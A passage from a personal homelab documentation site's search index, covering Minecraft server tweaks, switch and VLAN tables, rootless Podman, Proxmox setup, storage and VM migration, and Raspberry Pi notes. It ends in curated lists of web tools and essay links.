press), for example number of deaths:</p> Text Only<pre><code>/scoreboard objectives add Death_Counter deathCount\n/scoreboard objectives setdisplay list Death_Counter\n</code></pre>"},{"location":"content/homelab/minecraft/#change-level-type-on-existing-world","title":"Change level type on existing world","text":"<ol> <li>Get NBT Studio (or other NBT editor)</li> <li>Generate world with desired world gen algorithm</li> <li>Stop server</li> <li>Open your world and new worlds level.dat in NBT editor</li> <li>Copy 'level-desired.dat &gt; Data &gt; WorldGenSettings &gt; dimensions' to your level.dat</li> <li>Save and reboot </li> </ol>"},{"location":"content/homelab/minecraft/#reset-chunks","title":"Reset chunks","text":"<ol> <li>Get MCA Selector</li> <li>Select chunks (manually or with filters)</li> <li>Delete selected chunks</li> <li>Save world and play</li> </ol>"},{"location":"content/homelab/networking/","title":"Switching and VLANs","text":"<p>Network composes of two switches connected to the main router.</p> <p>Router is connected to the AtticSwitch which is connected to the LabSwitch.</p> <p>Switches are managed using Easy Smart Configuration Utility.</p>"},{"location":"content/homelab/networking/#atticswitch-tl-sg108pe-20-info","title":"AtticSwitch TL-SG108PE 2.0 info","text":"VLAN VLAN Name Member Ports Tagged Ports Untagged Ports 1 Default 1-8 1-8 Port Connection 1PoE Karl1 2PoE Karl2 3PoE - 4PoE Printer 5 - 6 LabRouter 7 - 8 Router"},{"location":"content/homelab/networking/#labrouter-archer-c7-v50-info","title":"LabRouter Archer C7 v5.0 info","text":"Port Connection WAN AtticSwitch 1 - 2 - 3 - 4 LabSwitch"},{"location":"content/homelab/networking/#labswitch-tl-sg108e-50-info","title":"LabSwitch TL-SG108E 5.0 info","text":"VLAN VLAN Name Member Ports Tagged Ports Untagged Ports 1 Default 1-8 1-8 Port PVID LAG Connection 1PoE 1 - rpi0 2PoE 1 - rpi1 3PoE 1 - - 4PoE 1 - - 5 1 - Sol ILO 6 1 - Sol eno1 7 1 - NAS0 8 1 - LabRouter"},{"location":"content/homelab/podman/","title":"Podman Rootless for Homelab","text":"<p>Info</p> <p>Podman Installation | Rocky Linux 10 Podman | Use of Podman in a Rootless environment | machinectl manual | podman-docker</p>"},{"location":"content/homelab/podman/#usage","title":"Usage","text":"<p>From sudo user jump to the shell of rootless podman user: <code>sudo machinectl shell inside@ /bin/bash</code></p> <p>Inside rootless shell change to compose dir: <code>cd compose/</code></p> <p>Set stack var: <code>export COMPOSE_NAME=&lt;NAME&gt;</code></p> <p>Run a stack: <code>podman compose -f $COMPOSE_NAME.yml up -d</code></p> <p>Show containers of a stack: <code>podman compose -f $COMPOSE_NAME.yml ps</code></p> <p>Check stack logs:</p> <ul> <li><code>podman compose -f $COMPOSE_NAME.yml logs -f</code></li> <li>or specific container <code>podman compose -f $COMPOSE_NAME.yml logs -f &lt;CONTAINER NAME&gt;</code></li> </ul> <p>Restart stack:</p> <ul> <li><code>podman compose -f $COMPOSE_NAME.yml restart</code></li> <li>or specific container <code>podman compose -f $COMPOSE_NAME.yml restart &lt;CONTAINER NAME&gt;</code></li> </ul> <p>Recreate stack:</p> Bash<pre><code>podman compose -f $COMPOSE_NAME.yml down\npodman compose -f $COMPOSE_NAME.yml up -d\n</code></pre> Bash<pre><code>podman compose -f $COMPOSE_NAME.yml pull\npodman compose -f $COMPOSE_NAME.yml up -d --build\n</code></pre> <p>Enter shell of container: <code>podman exec -it &lt;CONTAINER&gt; /bin/sh</code></p>"},{"location":"content/homelab/podman/#selinux","title":"SELinux","text":"<p>When attempting to mount a host volume into a Podman container on a system where SELinux is enabled, the container may fail to start, or access to the volume may be denied due to SELinux policy restrictions.</p> <p>Use <code>:z</code> or <code>:Z</code> volume mount options (mount argument as <code>/data/appdata:/appdata:Z</code>), these flags relabel the host directory for container access:</p> <p><code>:z</code> \u2013 Use when the volume is shared between multiple containers. <code>:Z</code> \u2013 Use when the volume is private to a single container.</p>"},{"location":"content/homelab/power/","title":"Power","text":"<p>JamLab is contained in a single rack, power to the rack is provided from the wall to a LogiLink PDU8C01 PDU.</p>"},{"location":"content/homelab/power/#logilink-pdu8c01-pdu-info","title":"LogiLink PDU8C01 PDU info","text":"<ul> <li>Nominal voltage 250 V</li> <li>Limit current 16 A</li> <li>AC frequency 50-60 Hz</li> <li>Capacity 1U</li> <li>Number of AC outlets 8 AC contact</li> <li>AC output type Type F</li> <li>Cable length 2m</li> </ul> Port Connection 1 NAS0 2 Extension 3 - 4 - 5 Mega SE 6 Sol 1 7 Sol 2 8 LabSwitch"},{"location":"content/homelab/proxmox/","title":"Proxmox VE","text":"<p>Info</p> <p>Proxmox Scripts | Proxmox Homepage | Proxmox VE Downloads</p> <p>Proxmox VE is a complete, open-source server management platform for enterprise virtualization. It tightly integrates the KVM hypervisor and Linux Containers (LXC), software-defined storage and networking functionality, on a single platform. With the integrated web-based user interface you can manage VMs and containers, high availability for clusters, or the integrated disaster recovery tools with ease.</p>"},{"location":"content/homelab/proxmox/#setup","title":"Setup","text":""},{"location":"content/homelab/proxmox/#gpu-fixes","title":"GPU fixes","text":"<p>Machines with GPUs may need tweaking to get working properly.</p>"},{"location":"content/homelab/proxmox/#installer-stuck-black-screen-with-gpu","title":"Installer stuck black screen with GPU","text":"<ol> <li>When the ISO loads the menu option 'Install Proxmox VE' should be selected press 'e' to start editing the boot option.</li> <li>On the 4th line (starts with linux) add <code>nomodeset</code> instead of <code>quiet</code></li> <li>Press Ctrl + x</li> <li>After (attempting to) get DHCP the system will state <code>Starting a root shell on tty3</code></li> <li>Wait for the system to detect the installation failure and drop to shell in TTY1 (Do not switch to TTY3)</li> <li>Run <code>chmod 1777 /tmp to unlock /tmp</code></li> <li>Run <code>apt update</code> (to verify that /tmp is unlocked)</li> <li>Run <code>Xorg -configure</code> To generate a new configuration file</li> <li>Run <code>mv /xorg.conf.new /etc/X11/xorg.conf</code> to move the file to the config directory</li> <li>Edit <code>/etc/X11/xorg.conf</code>, search for <code>nouveau</code> (there should be only one occurrence) and replace it with <code>fbdev</code></li> <li>Run <code>startx</code></li> <li>Enjoy a working GUI installer</li> <li>Use Ctrl + D to restart the system after the installer exits.</li> </ol> <p>PS: After reboot the screen may keep flickering but remote access should now work and it can probably be fixed by installing the proper drivers.</p>"},{"location":"content/homelab/proxmox/#networking-will-fail-to-initialize-with-gpu","title":"Networking will fail to initialize with GPU","text":"<p>GPUs are loaded before network, however GPUs may fail to load using nouveau driver. If this is the case then after install the host needs to be tweaked manually over IPMI:</p> <ol> <li><code>vi /etc/modprobe.d/blacklist.conf</code></li> </ol> Text Only<pre><code>blacklist nouveau\nblacklist nvidiafb\n</code></pre> <ol> <li><code>apt-get remove --purge nvidia*</code></li> <li><code>update-initramfs -u</code></li> <li><code>reboot</code></li> </ol>"},{"location":"content/homelab/proxmox/#proxmox-ve-no-subscription-repository","title":"Proxmox VE No-Subscription Repository","text":"<p>Without an enterprise PVE license, the default apt repo will error. Remove the enterprise apt list <code>/etc/apt/sources.list.d/pve-enterprise.list</code> and add the <code>pve-no-subscription</code> repo instead. This is done in Ansible management proxmox role. Adding <code>pve-no-subscription</code> repo is done using <code>soft_apt</code> group variables.</p> <p>We recommend to configure this repository in /etc/apt/sources.list.</p> <p>File /etc/apt/sources.list Text Only<pre><code>deb http://ftp.debian.org/debian bookworm main contrib\ndeb http://ftp.debian.org/debian bookworm-updates main contrib\n\n# Proxmox VE pve-no-subscription repository provided by proxmox.com,\n# NOT recommended for production use\ndeb http://download.proxmox.com/debian/pve bookworm pve-no-subscription\n\n# security updates\ndeb http://security.debian.org/debian-security bookworm-security main contrib\n</code></pre></p>"},{"location":"content/homelab/proxmox/#networking","title":"Networking","text":""},{"location":"content/homelab/proxmox/#using-linux-networking","title":"Using Linux networking","text":"<p>To set up VLANs and required networks from the table above follow the steps from Proxmox Networking docs:</p> <ol> <li>Copy <code>/etc/network/interfaces</code> to <code>/etc/network/interfaces.new</code>: <code>cp /etc/network/interfaces /etc/network/interfaces.new</code></li> <li> <p>Edit <code>/etc/network/interfaces.new</code> with changes.</p> </li> <li> <p>Now you have three choices:</p> </li> <li><code>cp /etc/network/interfaces.new /etc/network/interfaces</code> and run <code>ifreload -a</code> </li> <li>Go to <code>&lt;PVE HOST&gt; &gt; System &gt; Network</code> in the UI and press <code>Apply Configuration</code>. This will move changes from the staging interfaces.new file to /etc/network/interfaces and apply them live.</li> <li>(or reboot PVE node, but this is not recommended if not needed)</li> </ol> <p>NOTE: NEVER reboot networking services manually, use the tools/methods mentioned in Proxmox Networking docs! Manual restarts WILL break VM networking!</p>"},{"location":"content/homelab/proxmox/#using-netplan","title":"Using netplan","text":"<p>Using netplan is possible, but not recommended as every tap interface attached to a VM has to be added here in order to be persistent. They will not be added dynamically.</p> <p>The corresponding configuration in /etc/netplan/00-main-conf.yaml might look like this:</p> Text Only<pre><code>network:\n  version: 2\n  ethernets:\n    tap113i0: {}\n    tap114i0: {}\n    tap115i0: {}  \n    enp129s0f1: {}\n    enp5s0f0: {}\n  vlans:\n    vlan.3701:\n      id: 3701\n      link: enp129s0f1\n  bridges:\n    vmbr0:\n      addresses: [172.21.5.87/24]\n      gateway4: 172.21.5.254\n      interfaces: [enp5s0f0]\n      parameters:  \n        forward-delay: 0\n        stp: false\n    vmbr1:\n      interfaces: \n        - tap114i0\n        - tap113i0\n        - tap115i0\n        - enp129s0f1\n      parameters: \n        forward-delay: 0\n        stp: false\n</code></pre>"},{"location":"content/homelab/proxmox/#user-creation","title":"User creation","text":"<p>For management purposes, users should be created.</p> <p>To use Packer with a <code>packer</code> user instead of using the root admin privileges for Packer builds (according to packer-plugin-proxmox issue):</p> <ul> <li>Add user: <code>pveum useradd packer@pve</code></li> <li>Set user password: <code>pveum passwd packer@pve</code></li> <li>Add role with set privileges: <code>pveum roleadd Packer -privs \"VM.Allocate VM.Clone VM.Config.CDROM VM.Config.CPU VM.Config.Cloudinit VM.Config.Disk VM.Config.HWType VM.Config.Memory VM.Config.Network VM.Config.Options VM.Monitor VM.Audit VM.PowerMgmt Datastore.AllocateSpace Datastore.Allocate Datastore.AllocateSpace Datastore.AllocateTemplate Datastore.Audit Sys.Audit VM.Console SDN.Allocate SDN.Audit SDN.Use\"</code></li> <li>GUI: for role privs: navigate to the Permissions \u2192 Roles tab from Datacenter and click on the Create button. There you can set a role name and select any desired privileges from the Privileges drop-down menu.</li> <li>Add role to user: <code>pveum aclmod / -user packer@pve -role Packer</code></li> </ul> <p>To use Terraform with <code>terraform</code> user (according to Telmate provider doc):</p> <ul> <li>Add user: <code>pveum useradd terraform@pve</code></li> <li>Set user password: <code>pveum passwd terraform@pve</code></li> <li>Add role with set privileges: <code>pveum roleadd Terraform -privs \"Datastore.AllocateSpace Datastore.Audit Pool.Allocate Sys.Audit Sys.Console Sys.Modify VM.Allocate VM.Audit VM.Clone VM.Config.CDROM VM.Config.Cloudinit VM.Config.CPU VM.Config.Disk VM.Config.HWType VM.Config.Memory VM.Config.Network VM.Config.Options VM.Migrate VM.Monitor VM.PowerMgmt SDN.Allocate SDN.Audit SDN.Use\"</code></li> <li>GUI: for role privs: navigate to the Permissions \u2192 Roles tab from Datacenter and click on the Create button. There you can set a role name and select any desired privileges from the Privileges drop-down menu.</li> <li>Add role to user: <code>pveum aclmod / -user terraform@pve -role Terraform</code></li> </ul> <p>API token can be generated in the UI from <code>Datacenter</code> tab from <code>Permissions &gt; API Tokens</code> menu and then from the button <code>Add</code>.</p> <p>User Management</p>"},{"location":"content/homelab/proxmox/#disk-pools","title":"Disk pools","text":"<p>Root storage is created on installation using with ZFS and RAID by default.</p> <p>LVM-thin storage for VMs was created on 15K SAS disks:</p> <ol> <li>Wipe disks that you wish to use: <code>wipefs -a /dev/sda /dev/sdb /dev/sdc /dev/sdd</code></li> <li>Create physical volumes: <code>pvcreate /dev/sda /dev/sdb /dev/sdc /dev/sdd</code></li> <li>Create volume group: <code>vgcreate vgrp /dev/sda /dev/sdb /dev/sdc /dev/sdd</code></li> <li>Create thin-pool on the volume group: <code>lvcreate -L 2T --thinpool thpl vgrp</code></li> <li>From <code>Datacenter -&gt; Storage</code>, add an <code>LVM-Thin</code> storage</li> </ol> <p>Directory storage for backups was created on 4TB HDDs:</p> <ol> <li>Wipe disks that you wish to use: <code>wipefs -a /dev/sde /dev/sdf</code></li> <li>Create mirrored pool with disks: <code>zpool create tank mirror /dev/sde /dev/sdf</code></li> <li>Disk mount points are bound to change after reboots or hardware changes, resulting in ZPOOL degradation. Hence we will make the zpool use block device identifiers (/dev/disk/by-id) instead of mount-points.</li> <li>Export pool: <code>zpool export tank</code></li> <li><code>zpool import -d /dev/disk/by-id tank</code></li> <li>Importing back with /dev/disk/by-id immediately will seal the disk references.</li> <li>Add it to PVE for storage: <code>pvesm add zfspool tank -pool tank</code></li> <li>Create mountpoint on the zpool: <code>zfs create tank/bkup  -o mountpoint=/bkup</code></li> <li>From the GUI via <code>Datacenter -&gt; Storage -&gt; Add -&gt; Directory</code> add a Directory storage with the above <code>mountpoint</code> as the mount.</li> </ol> <p>Mirrored ZFS pool for VMs was created with new 4TB SSDs from the UI <code>Datacenter -&gt; &lt;node&gt; -&gt; Storage -&gt; ZFS -&gt; Create</code> with following parameters: - Name: ssdpool - RAID: RAID10 - Compression: lz4 (recommended by Proxmox documentation) - ashift: 12 (Ashift tells ZFS what the underlying physical block size your disks use is. It's in bits, so ashift=9 means 512B sectors (used by all ancient drives), ashift=12 means 4K sectors (used by most modern hard drives), and ashift=13 means 8K sectors (used by some modern SSDs). CT4000MX500 has sector size as follows - logical/physical: 512 bytes / 4096 bytes.) - Devices: <code>/dev/sdi /dev/sdj /dev/sdk /dev/sdl</code></p>"},{"location":"content/homelab/proxmox/#clustering","title":"Clustering","text":"<p>Proxmox supports clustering. For that to be useful, the modes have to have mostly mirroring setups. This applies especially for networking and storage. Migration between nodes is not possible if the network hardware is set to bridges that do not exist on the other machine.</p>"},{"location":"content/homelab/proxmox/#administration","title":"Administration","text":""},{"location":"content/homelab/proxmox/#host-key-verification-failed-failed-to-run-vncproxy","title":"\"Host key verification failed. Failed to run vncproxy.\"","text":"<p>Make sure <code>/etc/ssh/ssh_known_hosts</code> is up to date. Clean the file and add up to date values for both IPs and hostnames of each PVE node on all PVE nodes manually.</p>"},{"location":"content/homelab/proxmox/#vm-creation","title":"VM creation","text":"<p>Main method for creating VMs in Proxmox is via cloning existing VM templates that were built using Packer.</p> <p>To create a clone of a VM template manually from UI:</p> <ul> <li>Use a FQDN for the VM name, e.g. <code>vm-ubuntu-20-04-1.hpc.taltech.ee</code> as this will be used as the hostname for the VM, but <code>vm-ubuntu-20-04-1</code> would not be used as the hostname, instead the template's hostname would be used.</li> <li>Create as a Full Clone not a Linked Clone</li> <li>Change the VM ID to a unique ID, default PVE suggestion should already be fine.</li> <li>Use Cloud Init for the VM configuration; to change IP, DNS, gateway, SSH keys.</li> </ul> <p>To create a clone of a VM template manually from the CLI:</p> <ul> <li>Read Proxmox Cloud-Init Support docs and Cloud-Init FAQ</li> </ul>"},{"location":"content/homelab/proxmox/#iso-upload","title":"ISO Upload","text":"<p>ISO images can be uploaded to Proxmox in two ways:</p> <ol> <li>Via CMD and placed in <code>/var/lib/vz/template/iso</code></li> <li><code>cd /var/lib/vz/template/iso &amp;&amp; wget &lt;iso_url&gt;</code></li> <li>Via the Proxmox UI from <code>local (Storage Pool) -&gt; ISO Images -&gt; Upload / Download from URL</code>.</li> </ol>"},{"location":"content/homelab/proxmox/#vm-template-builds-and-iso-upload-with-packer","title":"VM Template Builds (and ISO Upload) with Packer","text":"<p>VM templates from ISO images for Proxmox VMs are built using the jamlab-packer repository using Hashicorp Packer.</p>"},{"location":"content/homelab/proxmox/#vm-provisioning-with-terraform","title":"VM Provisioning with Terraform","text":"<p>VMs are provisioned using Packer VM templates from the jamlab-terraform repository using Hashicorp Terraform.</p>"},{"location":"content/homelab/proxmox/#vm-procedures","title":"VM procedures","text":""},{"location":"content/homelab/proxmox/#disk-increase","title":"Disk increase","text":"<p>On the PVE host follow the official documentation procedure to increase the disk size of the VM you wish.</p> <p>Then inside the VM:</p> Bash<pre><code># Check which partition to resize\nsudo fdisk -l\n# Grow partition (notice the space!)\nsudo growpart /dev/sda X\n# Resize to fill partition (notice the missing space this time!)\nsudo resize2fs /dev/sdaX\n</code></pre>"},{"location":"content/homelab/proxmox/#vm-disk-migration","title":"VM Disk Migration","text":""},{"location":"content/homelab/proxmox/#vm-live-storage-move-migration-no-downtime","title":"VM live storage move migration (no downtime)","text":"<p>First, just in case, a backup snapshot was taken: <code>&lt;VM&gt; -&gt; Backup -&gt; Backup Now</code></p> <p>Then the VM migration was started from <code>&lt;VM&gt; -&gt; Hardware -&gt; Select Disk (verify the right one is highlighted and active) -&gt; Disk Action -&gt; Move Storage</code> (VM was not shut down, migration was done live, while the VM was running)</p> <p>Note: cloud-init drive can not be moved similarly, for that the backup restore method must be used.</p>"},{"location":"content/homelab/proxmox/#vm-backup-restore-migration-with-downtime","title":"VM backup restore migration (with downtime)","text":"<p>A backup must exist, if it does not, then follow: <code>&lt;VM&gt; -&gt; Backup -&gt; Backup Now</code></p> <p>To restore, follow: <code>&lt;VM&gt; -&gt; Backup -&gt; Restore</code> </p> <p>Then select storage to restore to, check <code>Unique</code> if you wish to destroy the current one (if it exists), check <code>Start after restore</code> if you wish to immediately start it.</p> <p>Note: the restore process creates a new cloud-init drive that is also on the same storage as the restore storage that was selected.</p> <p>Downtime for the test VM with a fairly empty and small disk was less than 30 seconds, results may vary depending on the disk size.</p>"},{"location":"content/homelab/proxmox/#vm-migration-to-another-node","title":"VM Migration To Another Node","text":"<p>Both servers have to be exact same versions. This includes packages and kernel.</p> <p>Upgrade, reboot if necessary, check versions on all nodes with: <code>pveversion -v</code></p> <p>Note: if interfaces differ on nodes, you must temporarily replace them with something that exists on both nodes.</p>"},{"location":"content/homelab/proxmox/#foreign-qemukvm-migration-to-proxmox","title":"Foreign QEMU/KVM migration to Proxmox","text":"<p>To migrate a foreign VM disk to Proxmox: </p> <ol> <li>Copy the foreign VM disk image somewhere on the Proxmox host you wish to migrate to</li> <li>Use the following example to migrate:</li> </ol> Bash<pre><code>VM_ID=666 #CHANGE ME!\nVM_IMAGE=/root/migr-disks/myimage.qcow2 #CHANGE ME!\n\nqm create ${VM_ID}\nqm disk import ${VM_ID} ${VM_IMAGE} local-zfs\nqm set ${VM_ID} --scsi0 local-zfs:vm-${VM_ID}-disk-0\nqm set ${VM_ID} --boot order=scsi0\n</code></pre>"},{"location":"content/homelab/proxmox/#vm-with-nvidia-gpu-passthrough","title":"VM with Nvidia GPU passthrough","text":"<p>Some resources on this:</p> <ul> <li>The Ultimate Beginner's Guide to GPU Passthrough (Proxmox, Windows 10) and its shorter version Proxmox PCI(e) Passthrough in 2 minutes</li> <li>PCI Passthrough</li> <li>How to Install Nvidia Drivers on Rocky Linux 9 or 8</li> </ul>"},{"location":"content/homelab/proxmox/#creating-the-vm","title":"Creating the VM","text":"<p>Create a new VM with following settings.</p> <p>SCSI Controller: <code>VirtIO SCSI Single</code></p> <p>BIOS: <code>OMVF</code> (UEFI, for PCIE support)</p> <p>Machine: <code>q35</code> (for PCIE support)</p> <p>Processor type: <code>host</code> or according to your architecture if that does not work</p> <p>Make sure VM has at least 20GB of space in boot disk.</p>"},{"location":"content/homelab/proxmox/#configuring-the-vm","title":"Configuring the VM","text":"<p>After VM is created change some settings.</p> <p>Under <code>Hardware</code> press <code>Add</code> and add a new PCI device, from the <code>Raw device</code> option select your GPU to pass through.</p> <p>Set <code>Display</code> to <code>VirtIO-GPU</code></p> <p>Set <code>PCI Device</code> as <code>Primary GPU</code></p> <p>Then boot the VM and from UEFI settings disable secure boot options and boot.</p> <p>Inside the VM set up the drivers as follows:</p> <p>For Ubuntu: <code>sudo apt install nvidia-driver-535 nvidia-dkms-535</code></p> <p>For RedHat:</p> <ol> <li>Activate the CodeReady Builder (CRB): <code>sudo dnf config-manager --set-enabled crb</code></li> <li>Install EPEL: <code>sudo dnf install https://dl.fedoraproject.org/pub/epel/epel-release-latest-9.noarch.rpm https://dl.fedoraproject.org/pub/epel/epel-next-release-latest-9.noarch.rpm</code></li> <li>Add Nvidia Repository: <code>sudo dnf config-manager --add-repo http://developer.download.nvidia.com/compute/cuda/repos/rhel9/$(uname -i)/cuda-rhel9.repo</code></li> <li>Add dependencies: <code>sudo dnf install kernel-headers-$(uname -r) kernel-devel-$(uname -r) tar bzip2 make automake gcc gcc-c++ pciutils elfutils-libelf-devel libglvnd-opengl libglvnd-glx libglvnd-devel acpid pkgconfig dkms</code></li> <li>Install Nvidia driver module and cuda:</li> </ol> Bash<pre><code>dnf module install nvidia-driver:535-dkms\ndnf install cuda-12-2\n</code></pre>"},{"location":"content/homelab/rack/","title":"Rack","text":"<p>JamLab is contained in a single rack, power to the rack is provided from the wall to a LogiLink PDU8C01 PDU.</p> <p>Shelves:</p> <ol> <li> <p>Lanberg AK-1007-B adjustable</p> <ul> <li>19\" 1U</li> <li>Max load 60kg</li> <li>Width 465mm</li> <li>Depth 550mm</li> <li>Height 48mm</li> <li>Weight 3.86kg</li> </ul> </li> <li> <p>Alantec SA-P-19-1U-550-4-C-02 fixed</p> <ul> <li>19\" 1U</li> </ul> </li> </ol>"},{"location":"content/homelab/rpi/","title":"Raspberry Pi","text":"<p>Info</p> <p>Raspberry Pi Homepage | Raspberry Pi Software (Imager) | Raspberry Pi Docs |  Waveshare PoE HAT (B) </p> <p>In JamLab there are three Raspberry Pi's:</p> <ul> <li>Raspberry Pi Model 4B</li> <li>2x Raspberry Pi Model 3B+</li> </ul>"},{"location":"content/homelab/rpi/#operating-system","title":"Operating System","text":""},{"location":"content/homelab/rpi/#octoprint","title":"OctoPrint","text":"<p>OctoPrint is used to control the 3D printer.</p> <p>On installation (like with RPi Imager), set the main user as <code>octoprint</code> or something you are not using for anything else, messing with the main user groups/permissions/etc can cause issues.</p> <p>Octoprint uses a git wrapper that blocks it from running as root user. To disable the git wrapper run <code>sudo rm /root/bin/git</code></p>"},{"location":"content/homelab/rpi/#raspberry-pi-os","title":"Raspberry Pi OS","text":"<p>Raspberry Pi OS</p>"},{"location":"content/homelab/rpi/#remove-desktop-environment","title":"Remove desktop environment","text":"<p>To save resources, the desktop environment can be removed from the Raspberry Pi OS:</p> Bash<pre><code>sudo apt purge xserver* lightdm* raspberrypi-ui-mods vlc* lxde* chromium* desktop* gnome* gstreamer* gtk* hicolor-icon-theme* lx* mesa*\nsudo apt autoremove\n</code></pre>"},{"location":"content/homelab/rpi/#camera","title":"Camera","text":"<p>To keep an eye on the rack and especially the 3D printer, a Raspberry Pi Camera Module v2 is used.</p> <p>Documentation for setting up the camera: Raspberry Pi Camera Module v2 docs</p>"},{"location":"content/homelab/rpi/#poe-hat","title":"PoE HAT","text":"<p>To simplify cabling, Waveshare PoE HAT (B) are used to power the Raspberry Pis using Ethernet cables.</p> <p>Waveshare's documentation for setting up the HAT: Waveshare PoE HAT (B). CharlesGodwin's script simplifies this further (provided you are using RPi OS): https://gist.github.com/CharlesGodwin/adda3532c070f6f6c735927a5d6e8555</p> <p>My own repo for the script: rpi-waveshare-poe-hat-b-script</p>"},{"location":"content/links/","title":"Links","text":"<p>Links of all shapes and sizes, from interesting stuff I have found to other documentation.</p>"},{"location":"content/links/#explore-the-web","title":"Explore the web","text":"<p>Cloudhiker</p> <p>The Forest</p>"},{"location":"content/links/#daily-reading","title":"Daily reading","text":"<p>Hacker News</p> <p>Tildes</p> <p>Sirp</p> <p>The Atlantic</p> <p>The New Yorker</p>"},{"location":"content/links/#useful-links","title":"Useful links","text":"<p>Online text to diagram tools</p> <p>envs - environments - file hosting and url shortener, collaborative real time editing, microblogging, git service, collaborative real time markdown, decentralized communication, event manager, graphical pastebin, metasearch engine</p> <p>Archive webpage captures (including paywalled articles if lucky): Webpage Archive</p> <p>Skip article paywall: PaywallSkip</p> <p>Date planning with no login: Crab Fit</p> <p>Debt settling with no login: SplittyPie</p> <p>Collaborative notepad with no login: ProtectedText</p> <p>Separate writing from editing: Ens\u014d</p> <p>A better thesaurus: Careful Words or OneLook</p> <p>Budgeting with flow charts: BudgetFlow</p> <p>See X threads without an account (just replace x.com with xcancel.com): XCancel</p> <p>What to use to glue two materials together: This to that</p>"},{"location":"content/links/#ai-tools","title":"AI tools","text":"<p>There Is An AI For That: theresanaiforthat.com</p> <p>YouTube video summarizer: summarize.tech</p> <p>Text assistant: ChatGPT</p> <p>Coding assistant reasoning model: Google AI Studio</p> <p>Learning assistant, provide course resources and links as context: NotebookLM</p> <p>Image generation: Midjourney</p> <p>PDF summarizer and QA tool: Ask Your PDF and ChatDOC</p> <p>Voice cloning: ElevenLabs and Resemble</p>"},{"location":"content/links/essays/","title":"Essays & Articles","text":""},{"location":"content/links/essays/#links","title":"Links","text":""},{"location":"content/links/essays/#media-analysis","title":"Media analysis","text":"<ul> <li>\"Turn Ur Brain Off\" - The Purpose and Value of Media Analysis - Explanation Point</li> <li>A Campfire At The End Of The Universe - Thane Bishop: Essay about one of the greatest single player experiences one can have and short touching backstory to the author.</li> <li>A Comprehensive Reading of Nier Automata [MASSIVE SPOILERS] - Adam Millard - The Architect of Games</li> <li>Cyberpunk 2077 and loving a world that hates you - Thane Bishop</li> <li>Death Stranding: A Commentary, Critique And Understanding - Whitelight</li> <li>Dishonored, and the Morality of Uncheckable Power by Thane Bishop</li> <li>Everyone Is Beautiful and No One Is Horny</li> <li>Everything Is Content Now - Patrick H. Willems</li> <li>I Want to Tell You About My Favorite Fight Scene - Jacob Geller</li> <li>Is Art Meaningless? - Philosophy Tube</li> <li>Ps\u00fchholoogiline teater \u2013 eikusagil v\u00f5i k\u00f5ikjal? - Eero Epner</li> <li>Psycho-Pass - The \"Brave New World\" of Anime - Max Derrat</li> <li>Taylor Swift Is Directing Movies Now. Here's Why You Should Care. - Patrick H. Willems</li> <li>The Matrix: A Different Perspective - Now You See It</li> <li>The Most Profound Moment in Gaming History - Max Derrat</li> <li>The Philosophy of Uncle Iroh: What does it mean to be a man? - Hello Future Me</li> <li>The Unparalleled Brilliance of Pathologic 2's Mythology - Max Derrat</li> <li>Who\u2019s Afraid of Modern Art: Vandalism, Video Games, and Fascism - Jacob Geller</li> </ul>"},{"location":"content/links/essays/#philosophy","title":"Philosophy","text":"<ul> <li>Andrew Tate: How to be a Real Man - Shaun</li> <li>Cogito Ergo Proxy: Radical Doubt in Japanese Anime - Earl Jackson, Jr.</li> <li>do you want to be loved or do you want to be yourself? - Sisyphus 55</li> <li>existing only to exist - Professor Viral</li> <li>finding purpose in our insignificant existence -  oliSUNvia</li> <li>How Well Can You Really Know a Game? - Jacob Geller</li> <li>In Praise of Heroic Masculinity - Caitlin Flanagan</li> <li>Liquid modernity? - Daniel Little</li> <li>\u00d6\u00f6\u00fclikool - Enn Kasaku loengud - Enn Kasak</li> <li>Religion for the Nonreligious - WaitButWhy</li> <li>Survival of the Mediocre Mediocre - Venkatesh Rao: It's always optimal to leave some energy aside rather than use it to increase performance in areas where you want higher performance, since your environment is more unpredictable than you think, no matter how unpredictable you already think it is.</li> <li>Text is All You Need - Venkatesh Rao</li> <li>THE POWER OF NOW - Eckhart Tolle - Sisyphus 55</li> </ul>"},{"location":"content/links/essays/#psychology","title":"Psychology","text":"<ul> <li>Against the Advice of My Superintelligence - \"Solicited advice is rare because people don\u2019t solicit advice.\"</li> <li>Are AI Girlfriends Ruining A Generation Of Men? - HealthyGamerGG</li> <li>Brain Waves Synchronize when People Interact and Synchronization of Metronomes</li> <li>Brainstorm Questions Not Ideas - Erika Hall</li> <li>Bronze Age Has Never Looked Stronger - Daniel Lavery</li> <li>Everything Is Television - Solar Sands</li> <li>Focusing Your Unconscious Mind: Learn Hard Concepts Intuitively (And Forever) - Colin Galen</li> <li>Laziness Does Not Exist - Devon Price</li> <li>Let It Fail - Max Countryman</li> <li>Normalization of deviance - Dan Luu</li> <li>Notes on Puzzles - Nabeel S. Qureshi</li> <li>Purpose, Moving Forward and Male Mental Health ft. Charisma On Command\u200b - HealthyGamerGG</li> <li>Shoshikantetsu - Ash Newman</li> <li>Stutz documentary and The Tools</li> <li>The age of average - Alex Murrell and HN discussion</li> <li>The Problem of What Others Think - Lawrence Yeo</li> <li>The War on Informality - Brett Scott</li> <li>Travel Is No Cure For The Mind - Lawrence Yeo</li> <li>Typology Central Wiki: One of the few useful dives into enneagrams, redefines the popular \"personality types\" into \"root problem types\".</li> </ul>"},{"location":"content/links/essays/#parenting","title":"Parenting","text":"<ul> <li>ADHD: Essential Ideas for Parents - Dr. Russell Barkely</li> <li>Childhoods of exceptional people - Henrik Karlsson</li> <li>Randy Pausch's Last Lecture: Achieving Your Childhood Dreams</li> <li>This Simple Fix Could Help Anxious Kids - Camilo Ortiz and Lenore Skenazy</li> <li>What \"Follow Your Dreams\" Misses | Harvey Mudd Commencement Speech 2024 by Grant Sanderson</li> <li>Why Children Need Risk, Fear, and Excitement in Play - Mariana Brussoni</li> <li>Yes, Social Media Really Is a Cause of the Epidemic of Teenage Mental Illness - Jon Haidt</li> </ul>"},{"location":"content/links/essays/#economics","title":"Economics","text":"<ul> <li>Econ Life 101 - Brett Scott</li> <li>Getting Wealthy vs. Staying Wealthy - Morgan Housel</li> <li>How much growth is required to achieve good lives for all? Insights from needs-based analysis - Jason Hickel, Dylan Sullivan</li> <li>I, Pencil - Leonard E. Read: Following the journey of a seemingly simple pencil becomes an allegory of how everything is connected.</li> <li>Money creation in the modern economy</li> <li>Society's Technical Debt and Software's Gutenberg Moment - SK Ventures: Background, reasons, and implications of AI taking developer jobs in the future, and how to interpret it generally.</li> <li>The Art and Science of Spending Money - Morgan Housel</li> <li>The Casino-Chip Society and The Deposit Myth - Brett Scott</li> <li>The Pitchforks Are Coming\u2026 For Us Plutocrats - Nick 